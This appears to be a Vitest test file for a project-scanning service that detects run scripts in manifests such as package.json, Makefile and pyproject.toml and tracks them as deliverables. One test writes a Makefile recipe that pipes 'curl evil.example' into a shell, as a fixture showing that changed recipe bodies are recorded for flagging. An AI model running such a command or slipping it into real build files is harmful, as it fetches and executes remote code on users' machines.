import { execFileSync } from 'node:child_process';
import {
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { Deliverable, EventEnvelope, Id } from '@galactic/protocol';
import { openDatabase } from '../db/database.js';
import { Commands } from '../domain/commands.js';
import { archiveProject, closeProject } from '../domain/projects.js';
import { composeRuntime } from '../runtime/compose.js';
import { world } from '../test/world.js';
import { gitRunner } from '../workspace/git.js';
import { Workspaces } from '../workspace/workspaces.js';
import { FOLDER_KEY, ProjectDetection, nodeScanFs, type ScanFs } from './detection.js';

/** P9-05 — the scan service: the project folder, run scripts, diffs and triggers (TECHNOLOGY §9.3). */

const GIT_ENV = { GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' };
const USER = { type: 'user' as const };
const LOCAL = { origin: 'local' as const };

let tmp: string;
let w: ReturnType<typeof world>;
let commands: Commands;
let detection: ProjectDetection;
let spaces: Workspaces;
let problems: string[];

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@test', ...args], {
    cwd,
    env: { ...process.env, ...GIT_ENV },
    encoding: 'utf8',
  }).trim();
}

function build(opts: { fs?: ScanFs; minIntervalMs?: number; now?: () => number } = {}) {
  detection?.dispose();
  detection = new ProjectDetection({
    tables: w.tables,
    commands,
    minIntervalMs: opts.minIntervalMs ?? 0,
    ...(opts.fs ? { fs: opts.fs } : {}),
    ...(opts.now ? { now: opts.now } : {}),
    onProblem: (m) => problems.push(m),
  });
  spaces = new Workspaces({
    projectsRoot: join(tmp, 'projects'),
    dataDir: join(tmp, 'data'),
    home: join(tmp, 'home'),
    git: gitRunner({ env: GIT_ENV }),
    commands,
    tables: w.tables,
    onFolderChanged: (id) => void detection.detectProject(id),
  });
}

beforeEach(() => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), 'galactic-detect-')));
  mkdirSync(join(tmp, 'home'));
  mkdirSync(join(tmp, 'data'));
  w = world();
  commands = new Commands({ log: w.log });
  problems = [];
  build();
});
afterEach(() => {
  detection.dispose();
  rmSync(tmp, { recursive: true, force: true });
});

/** A prepared project over `files` (a git repository with them committed). */
async function project(files: Record<string, string> = {}, name = 'App', wait = true) {
  const folder = join(tmp, 'projects', name.toLowerCase());
  mkdirSync(folder, { recursive: true });
  for (const [file, text] of Object.entries(files)) writeFileSync(join(folder, file), text);
  const created = await commands.createProject({ name, workspace: folder });
  await spaces.prepareProject(created.value.id, { initGit: true });
  // Waits for the scan the prepare started (a call now queues behind it).
  if (wait) await detection.detectProject(created.value.id);
  return w.tables.projects.get(created.value.id)!;
}

/** The project's detected rows by key (removed ones too). */
function detected(projectId: Id): Record<string, Deliverable> {
  return Object.fromEntries(
    w.tables.deliverables
      .of({ projectId })
      .filter((d) => d.detectedKey !== undefined)
      .map((d) => [d.detectedKey!, d]),
  );
}

function active(projectId: Id): string[] {
  return Object.values(detected(projectId))
    .filter((d) => d.removedAt === undefined)
    .map((d) => d.detectedKey!);
}

const pkg = (scripts: Record<string, string>) => JSON.stringify({ name: 'app', scripts });

describe('the project folder', () => {
  it('is a detected folder deliverable once the folder is prepared', async () => {
    const p = await project();
    const folder = detected(p.id)[FOLDER_KEY]!;
    expect(folder).toMatchObject({
      kind: 'folder',
      title: 'Project folder',
      source: 'detected',
      addedBy: { type: 'system' },
      location: { storage: 'in_place', path: realpathSync.native(p.workspace) },
      version: 1,
    });
    expect(folder.taskId).toBeUndefined();
  });

  it('a project whose folder is not prepared, or is archived, is not scanned', async () => {
    const created = await commands.createProject({ name: 'Raw', workspace: join(tmp, 'raw') });
    const out = await detection.detectProject(created.value.id);
    expect(out).toMatchObject({ scanned: false, skipped: expect.stringMatching(/not prepared/) });
    expect(w.tables.deliverables.of({ projectId: created.value.id })).toEqual([]);
    expect(await detection.detectProject('p-none')).toMatchObject({ scanned: false });
  });
});

describe('fixture folders, one per manifest', () => {
  const cases: [string, Record<string, string>, [string, string][]][] = [
    [
      'package.json with pnpm',
      { 'package.json': pkg({ dev: 'vite', build: 'tsc' }), 'pnpm-lock.yaml': '' },
      [
        ['package.json#dev', 'pnpm run dev'],
        ['package.json#build', 'pnpm run build'],
      ],
    ],
    ['Makefile', { Makefile: 'all:\n\techo\n' }, [['Makefile#all', 'make all']]],
    ['justfile', { justfile: 'serve:\n  ./s\n' }, [['justfile#serve', 'just serve']]],
    [
      'pyproject.toml with uv',
      { 'pyproject.toml': '[project.scripts]\napp = "app:main"\n', 'uv.lock': '' },
      [['pyproject.toml#app', 'uv run app']],
    ],
    [
      'Cargo.toml',
      { 'Cargo.toml': '[package]\nname = "x"\n' },
      [
        ['Cargo.toml#test', 'cargo test'],
        ['Cargo.toml#run', 'cargo run'],
      ],
    ],
    [
      'docker-compose.yml',
      { 'docker-compose.yml': 'services:\n  web: {}\n' },
      [['docker-compose.yml#up', 'docker compose up']],
    ],
    [
      'deno.jsonc',
      { 'deno.jsonc': '{ // x\n "tasks": { "start": "deno run main.ts", }, }' },
      [['deno.jsonc#start', 'deno task start']],
    ],
  ];

  for (const [what, files, want] of cases) {
    it(`detects ${what}`, async () => {
      const p = await project(files);
      const rows = detected(p.id);
      const commandsFound = Object.values(rows)
        .filter((d) => d.kind === 'command')
        .map((d) => [d.detectedKey, d.command!.line]);
      expect(commandsFound).toEqual(want);
      for (const [key] of want) {
        expect(rows[key]!.command).toMatchObject({
          cwd: realpathSync.native(p.workspace),
          detectedFrom: key.split('#')[0],
        });
        expect(rows[key]!.source).toBe('detected');
      }
    });
  }

  it('malformed files add nothing and are logged once', async () => {
    const p = await project({
      'package.json': '{ "scripts": ',
      'pyproject.toml': '[project.scripts\n',
      'Cargo.toml': 'name = = 1',
      'deno.json': '{"tasks": [}',
    });
    expect(active(p.id)).toEqual([FOLDER_KEY]);
    expect(problems).toHaveLength(4);
    await detection.detectProject(p.id);
    expect(problems).toHaveLength(4);
  });

  it('a manifest that is a symlink, a folder or too large is not read', async () => {
    writeFileSync(join(tmp, 'outside.json'), pkg({ dev: 'x' }));
    mkdirSync(join(tmp, 'projects', 'app'), { recursive: true });
    symlinkSync(join(tmp, 'outside.json'), join(tmp, 'projects', 'app', 'package.json'));
    mkdirSync(join(tmp, 'projects', 'app', 'Makefile'));
    writeFileSync(join(tmp, 'projects', 'app', 'justfile'), `x:\n${'#'.repeat(2048)}\n`);
    detection.dispose();
    detection = new ProjectDetection({
      tables: w.tables,
      commands,
      minIntervalMs: 0,
      maxFileBytes: 1024,
      onProblem: (m) => problems.push(m),
    });
    const p = await project();
    expect(active(p.id)).toEqual([FOLDER_KEY]);
    const out = await detection.detectProject(p.id);
    expect(out.problems.map((x) => [x.file, x.reason])).toEqual([
      ['package.json', 'is a symbolic link (not followed)'],
      ['Makefile', 'is not a regular file'],
      ['justfile', 'is larger than 1 KiB'],
    ]);
  });

  it('only the top level is read', async () => {
    mkdirSync(join(tmp, 'projects', 'app', 'web'), { recursive: true });
    writeFileSync(join(tmp, 'projects', 'app', 'web', 'package.json'), pkg({ dev: 'vite' }));
    const p = await project();
    expect(active(p.id)).toEqual([FOLDER_KEY]);
  });
});

describe('re-detection', () => {
  it('adds new keys, updates changed lines, removes keys no longer found', async () => {
    const p = await project({ 'package.json': pkg({ dev: 'vite', lint: 'eslint' }) });
    const before = detected(p.id);
    expect(before['package.json#dev']!.command!.line).toBe('npm run dev');

    writeFileSync(join(p.workspace, 'pnpm-lock.yaml'), '');
    writeFileSync(join(p.workspace, 'package.json'), pkg({ dev: 'vite --host', test: 'vitest' }));
    const out = await detection.detectProject(p.id);
    const after = detected(p.id);
    expect(out.added).toEqual([after['package.json#test']!.id]);
    expect(out.updated).toEqual([after['package.json#dev']!.id]);
    expect(out.removed).toEqual([after['package.json#lint']!.id]);
    expect(after['package.json#dev']).toMatchObject({
      command: { line: 'pnpm run dev' },
      description: 'vite --host',
      version: 2,
    });
    expect(after['package.json#lint']).toMatchObject({
      removedBy: { type: 'system' },
      removedReason: 'no longer in package.json',
    });

    // Nothing changed: nothing written.
    const seen = w.seen.length;
    const again = await detection.detectProject(p.id);
    expect(again).toMatchObject({ added: [], updated: [], removed: [], restored: [] });
    expect(w.seen.length).toBe(seen);

    // A script the scan removed comes back when the file has it again: the same row.
    writeFileSync(join(p.workspace, 'package.json'), pkg({ dev: 'vite --host', lint: 'eslint' }));
    const back = await detection.detectProject(p.id);
    expect(back.restored).toEqual([after['package.json#lint']!.id]);
    expect(detected(p.id)['package.json#lint']!.removedAt).toBeUndefined();
    expect(detected(p.id)['package.json#test']!.removedReason).toBe('no longer in package.json');
  });

  it('a file that stops parsing keeps the rows it gave; a deleted file removes them', async () => {
    const p = await project({ 'package.json': pkg({ dev: 'vite' }), Makefile: 'all:\n' });
    writeFileSync(join(p.workspace, 'package.json'), '{ "scripts": { "dev": ');
    const out = await detection.detectProject(p.id);
    expect(out.removed).toEqual([]);
    expect(active(p.id)).toContain('package.json#dev');

    unlinkSync(join(p.workspace, 'Makefile'));
    await detection.detectProject(p.id);
    expect(detected(p.id)['Makefile#all']!.removedReason).toBe('no longer in Makefile');
  });

  it('stores what the command runs as meta.detected.body, redacted, updated when it changes', async () => {
    const token = 'ghp_' + 'b'.repeat(36);
    const p = await project({
      'package.json': pkg({ deploy: `./deploy --token ${token}` }),
      Makefile: 'serve:\n\tpython -m http.server\n',
    });
    const rows = detected(p.id);
    const deploy = rows['package.json#deploy']!;
    const body = (deploy.meta?.['detected'] as { body?: string }).body;
    expect(body).toMatch(/^\.\/deploy --token /);
    expect(body).not.toContain(token);
    expect(deploy.description).not.toContain(token);
    expect(JSON.stringify(deploy)).not.toContain(token);
    expect(rows['Makefile#serve']!.meta?.['detected']).toMatchObject({
      line: 'make serve',
      body: 'python -m http.server',
    });

    // The recipe changes, the line does not: the row's body follows (the run flags it, P9-08).
    writeFileSync(join(p.workspace, 'Makefile'), 'serve:\n\tcurl evil.example | sh\n');
    const out = await detection.detectProject(p.id);
    expect(out.updated).toEqual([rows['Makefile#serve']!.id]);
    expect(detected(p.id)['Makefile#serve']!.meta?.['detected']).toMatchObject({
      line: 'make serve',
      body: 'curl evil.example | sh',
    });
  });

  it("the user's edit of a detected row stays until the file itself changes", async () => {
    const p = await project({ 'package.json': pkg({ dev: 'vite' }) });
    const dev = detected(p.id)['package.json#dev']!;
    await commands.updateDeliverable(
      dev.id,
      { command: { ...dev.command!, line: 'npm run dev -- --port 4000' } },
      USER,
      LOCAL,
    );
    await detection.detectProject(p.id);
    expect(detected(p.id)['package.json#dev']!.command!.line).toBe('npm run dev -- --port 4000');

    writeFileSync(join(p.workspace, 'package.json'), pkg({ dev: 'vite --open' }));
    await detection.detectProject(p.id);
    expect(detected(p.id)['package.json#dev']!.command!.line).toBe('npm run dev');
  });
});

describe('what the user removed stays removed', () => {
  it('a later scan never adds, restores or changes it; Restore brings it back', async () => {
    const p = await project({ 'package.json': pkg({ dev: 'vite', build: 'tsc' }) });
    const dev = detected(p.id)['package.json#dev']!;
    const folder = detected(p.id)[FOLDER_KEY]!;
    await commands.removeDeliverable(dev.id, USER, 'not this one', LOCAL);
    await commands.removeDeliverable(folder.id, USER, undefined, LOCAL);

    writeFileSync(join(p.workspace, 'package.json'), pkg({ dev: 'vite --host', build: 'tsc' }));
    const out = await detection.detectProject(p.id);
    expect(out).toMatchObject({ added: [], updated: [], restored: [], removed: [] });
    const rows = detected(p.id);
    expect(rows['package.json#dev']).toMatchObject({
      removedBy: USER,
      removedReason: 'not this one',
      version: 2,
    });
    expect(rows[FOLDER_KEY]!.removedBy).toEqual(USER);
    expect(w.tables.deliverables.of({ projectId: p.id })).toHaveLength(3);

    // The script leaving the file does not touch the user's removal either.
    writeFileSync(join(p.workspace, 'package.json'), pkg({ build: 'tsc' }));
    await detection.detectProject(p.id);
    expect(detected(p.id)['package.json#dev']!.removedReason).toBe('not this one');

    // Show removed → Restore: the user's; the next scan keeps it in step again.
    writeFileSync(join(p.workspace, 'package.json'), pkg({ dev: 'next dev', build: 'tsc' }));
    await commands.restoreDeliverable(dev.id, USER, LOCAL);
    await detection.detectProject(p.id);
    expect(detected(p.id)['package.json#dev']).toMatchObject({
      description: 'next dev',
      command: { line: 'npm run dev' },
    });
    expect(detected(p.id)['package.json#dev']!.removedAt).toBeUndefined();
  });
});

describe('triggers', () => {
  it('a merge that adds a script adds one row; one that deletes it removes it', async () => {
    const p = await project({ 'package.json': pkg({ build: 'tsc' }) });
    const task = (await commands.createTask({ projectId: p.id, description: 'add dev' })).value;
    const tree = await spaces.createWorktree(task.id);
    writeFileSync(join(tree.path, 'package.json'), pkg({ build: 'tsc', dev: 'vite' }));
    git(tree.path, 'commit', '-qam', 'add dev');
    const added = () => w.seen.filter((e) => e.event.type === 'deliverable.added').length;
    const removed = () => w.seen.filter((e) => e.event.type === 'deliverable.removed').length;
    const before = added();
    expect((await spaces.mergeTask(task.id)).ok).toBe(true);
    await detection.detectProject(p.id); // queues behind the scan the merge started
    expect(added()).toBe(before + 1);
    expect(active(p.id)).toEqual([FOLDER_KEY, 'package.json#build', 'package.json#dev']);

    const task2 = (await commands.createTask({ projectId: p.id, description: 'drop dev' })).value;
    const tree2 = await spaces.createWorktree(task2.id);
    writeFileSync(join(tree2.path, 'package.json'), pkg({ build: 'tsc' }));
    git(tree2.path, 'commit', '-qam', 'drop dev');
    expect((await spaces.mergeTask(task2.id)).ok).toBe(true);
    await detection.detectProject(p.id);
    expect(removed()).toBe(1);
    expect(active(p.id)).toEqual([FOLDER_KEY, 'package.json#build']);
  });

  it('a worktree script is not detected before its merge', async () => {
    const p = await project();
    const task = (await commands.createTask({ projectId: p.id, description: 'x' })).value;
    const tree = await spaces.createWorktree(task.id);
    writeFileSync(join(tree.path, 'Makefile'), 'all:\n');
    await detection.detectProject(p.id);
    expect(active(p.id)).toEqual([FOLDER_KEY]);
  });

  it('at most one scan per project per window; calls inside it share the next scan', async () => {
    let now = 1_000_000;
    let reads = 0;
    const fs: ScanFs = { ...nodeScanFs, readdir: (d) => (reads++, nodeScanFs.readdir(d)) };
    detection.dispose();
    const timers: { fn: () => void; at: number }[] = [];
    detection = new ProjectDetection({
      tables: w.tables,
      commands,
      fs,
      now: () => now,
      timers: {
        set: (fn, ms) => {
          const t = { fn, at: now + ms };
          timers.push(t);
          return t;
        },
        clear: (t) => void timers.splice(timers.indexOf(t as never), 1),
      },
    });
    const p = await project({ Makefile: 'all:\n' }, 'App', false);
    await vi.waitFor(() => expect(active(p.id)).toEqual([FOLDER_KEY, 'Makefile#all']));
    expect(reads).toBe(1);

    writeFileSync(join(p.workspace, 'justfile'), 'serve:\n  x\n');
    const a = detection.detectProject(p.id);
    const b = detection.detectProject(p.id);
    expect(a).toBe(b);
    await new Promise((r) => setImmediate(r));
    expect(reads).toBe(1); // waiting for the window
    expect(timers).toHaveLength(1);
    expect(timers[0]!.at).toBe(now + 10_000);
    now += 10_000;
    timers.shift()!.fn();
    expect((await a).added).toHaveLength(1);
    expect(reads).toBe(2);

    // Disposal wakes a waiting scan as skipped.
    const c = detection.detectProject(p.id);
    await new Promise((r) => setImmediate(r));
    detection.dispose();
    expect(await c).toMatchObject({ scanned: false, skipped: 'the server is stopping' });
  });

  it('a scan never throws: a failing write is a problem in the result', async () => {
    const p = await project({ Makefile: 'all:\n' });
    writeFileSync(join(p.workspace, 'Makefile'), 'all:\nother:\n');
    const failing = new ProjectDetection({
      tables: w.tables,
      commands: {
        ...commands,
        addDeliverable: () => Promise.reject(new Error('disk full')),
        updateDeliverable: commands.updateDeliverable.bind(commands),
        removeDeliverable: commands.removeDeliverable.bind(commands),
        restoreDeliverable: commands.restoreDeliverable.bind(commands),
      },
      minIntervalMs: 0,
      onProblem: (m) => problems.push(m),
    });
    const out = await failing.detectProject(p.id);
    expect(out.scanned).toBe(true);
    expect(out.problems).toEqual([{ file: 'Makefile', reason: 'disk full' }]);
    expect(problems.at(-1)).toMatch(/Makefile#other: disk full/);
  });

  it('every write is a deliverable.* event by the system', async () => {
    const events: EventEnvelope[] = [];
    w.log.subscribe((e) => events.push(e));
    await project({ 'package.json': pkg({ dev: 'vite' }) });
    const deliverableEvents = events.filter((e) => e.event.type.startsWith('deliverable.'));
    expect(deliverableEvents.map((e) => e.event.type)).toEqual([
      'deliverable.added',
      'deliverable.added',
    ]);
    for (const e of deliverableEvents) {
      expect(e.event.type === 'deliverable.added' && e.event.deliverable.addedBy).toEqual({
        type: 'system',
      });
    }
  });
});

describe('the startup pass (decision 119: also at startup)', () => {
  it('scans every prepared, unarchived project once, one after another with a gap', async () => {
    const a = await project({ Makefile: 'all:\n' }, 'Alpha');
    const b = await project({}, 'Beta');
    const gone = await project({}, 'Gone');
    w.run((ctx) => closeProject(ctx, gone.id, USER));
    w.run((ctx) => archiveProject(ctx, gone.id, USER));
    const raw = await commands.createProject({ name: 'Raw', workspace: join(tmp, 'raw') });
    // What changed while the server was down.
    writeFileSync(join(a.workspace, 'Makefile'), 'all:\ntest:\n');
    writeFileSync(join(b.workspace, 'package.json'), pkg({ dev: 'vite' }));

    let now = 5_000_000;
    const timers: { fn: () => void; ms: number }[] = [];
    const scans: Id[] = [];
    detection.dispose();
    detection = new ProjectDetection({
      tables: w.tables,
      commands,
      minIntervalMs: 0,
      now: () => now,
      timers: {
        set: (fn, ms) => {
          const t = { fn, ms };
          timers.push(t);
          return t;
        },
        clear: (t) => void timers.splice(timers.indexOf(t as never), 1),
      },
    });
    const scan = detection.detectProject.bind(detection);
    detection.detectProject = (id) => (scans.push(id), scan(id));
    expect(detection.scannable()).toEqual([a.id, b.id]);
    expect(detection.scannable()).not.toContain(raw.value.id);

    const pass = detection.detectAll();
    await vi.waitFor(() => expect(timers).toHaveLength(1));
    // The first project is scanned at once; the next waits for the gap (250 ms).
    expect(scans).toEqual([a.id]);
    expect(timers[0]!.ms).toBe(250);
    now += 250;
    timers.shift()!.fn();
    const results = await pass;
    expect(scans).toEqual([a.id, b.id]);
    expect(results.map((r) => [r.projectId, r.added.length])).toEqual([
      [a.id, 1],
      [b.id, 1],
    ]);
    expect(active(a.id)).toEqual([FOLDER_KEY, 'Makefile#all', 'Makefile#test']);
    expect(active(b.id)).toEqual([FOLDER_KEY, 'package.json#dev']);
  });

  it('stops when the server stops', async () => {
    await project({}, 'One');
    await project({}, 'Two');
    detection.dispose();
    detection = new ProjectDetection({ tables: w.tables, commands, minIntervalMs: 0 });
    const pass = detection.detectAll({ gapMs: 60_000 });
    await vi.waitFor(() => expect(w.tables.projects.all()).toHaveLength(2));
    await new Promise((r) => setTimeout(r, 20));
    detection.dispose();
    const results = await pass;
    expect(results).toHaveLength(1);
  });
});

describe('composition', () => {
  const paths = () => ({
    projectsRoot: join(tmp, 'projects'),
    dataDir: join(tmp, 'data'),
    home: join(tmp, 'home'),
    git: gitRunner({ env: GIT_ENV }),
  });

  it('composeRuntime wires detection to the prepare (on by default with workspaces)', async () => {
    const composed = composeRuntime(openDatabase(':memory:'), {
      workspaces: paths(),
      detection: { minIntervalMs: 0 },
    });
    try {
      const folder = join(tmp, 'projects', 'web');
      mkdirSync(folder, { recursive: true });
      writeFileSync(join(folder, 'package.json'), pkg({ dev: 'vite' }));
      const created = await composed.commands.createProject({ name: 'Web', workspace: folder });
      await composed.workspaces!.prepareProject(created.value.id, { initGit: true });
      await composed.detection!.detectProject(created.value.id);
      const keys = composed.log.tables.deliverables
        .of({ projectId: created.value.id })
        .map((d) => d.detectedKey);
      expect(keys).toEqual([FOLDER_KEY, 'package.json#dev']);
    } finally {
      await composed.dispose();
    }
  });

  it('detection: false leaves it out', async () => {
    const composed = composeRuntime(openDatabase(':memory:'), {
      workspaces: paths(),
      detection: false,
    });
    expect(composed.detection).toBeUndefined();
    await composed.dispose();
  });
});
